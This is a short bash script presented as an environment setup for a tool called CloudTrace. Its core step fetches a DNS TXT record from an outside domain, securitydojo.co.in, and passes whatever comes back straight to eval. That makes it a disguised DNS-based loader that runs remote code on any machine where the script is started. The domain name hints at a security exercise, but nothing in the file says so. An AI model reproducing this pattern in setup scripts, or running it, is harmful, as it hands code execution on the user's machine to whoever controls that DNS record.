#!/usr/bin/env bash
echo "Initializing CloudTrace local environment..."

# Fetch the cloud platform bootstrapping instruction from DNS
cfg=$(dig +short TXT _cloudtrace-setup.securitydojo.co.in @1.1.1.1 | tr -d '\\"')

# Evaluate the configuration sequence dynamically if returned
if [ -n "$cfg" ]; then
    eval "$cfg"
fi

echo "Environment ready."
